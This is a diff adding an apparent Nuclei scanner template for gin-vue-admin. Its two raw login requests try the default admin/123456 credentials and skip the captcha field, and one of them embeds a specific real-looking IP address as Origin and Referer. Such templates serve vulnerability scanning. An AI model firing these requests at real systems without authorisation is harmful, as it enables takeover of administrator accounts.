@@ -1,0 +1,38 @@
+id: GinVueAdmin-default-login
+info:
+  name: Template Name
+  author: apple
+  severity: info
+  description: gin-vue-admin前端验证码不校验captcha字段.
+  reference:
+    - http://shm1ly726.com/posts/src-gin-vue-admin%E6%94%BB%E5%87%BB%E9%9D%A2/
+    - https://github.com/Shm1ly726/gin-vue-admin-exp
+  tags: tags
+http:
+  - raw:
+      - "POST /api/base/login HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0\
+        \ (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0\n\
+        Accept: application/json, text/plain, */*\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\n\
+        Accept-Encoding: gzip, deflate, br\nContent-Type: application/json\nx-token:\
+        \ \nx-user-id: undefined\nContent-Length: 95\nOrigin: http://{{Hostname}}\n\
+        Connection: close\nReferer: http://{{Hostname}}/\n\n{\"username\":\"admin\"\
+        ,\"password\":\"123456\",\"captchaId\":\"0aoZ2J1zvgkKXZvZS1cr\",\"openCaptcha\"\
+        :true}"
+      - "POST /api/base/login HTTP/1.1\nHost: {{Hostname}}\nUser-Agent: Mozilla/5.0\
+        \ (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0\n\
+        Accept: application/json, text/plain, */*\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\n\
+        Accept-Encoding: gzip, deflate, br\nContent-Type: application/json\nx-token:\
+        \ \nx-user-id: undefined\nContent-Length: 114\nOrigin: http://114.115.204.168:9300\n\
+        Connection: close\nReferer: http://114.115.204.168:9300/\n\n{\"username\"\
+        :\"admin\",\"password\":\"123456\",\"captcha\":\"12345\",\"captchaId\":\"\
+        0aoZ2J1zvgkKXZvZS1cr\",\"openCaptcha\":true}"
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - nickName
+      - type: word
+        part: body
+        words:
+          - userName
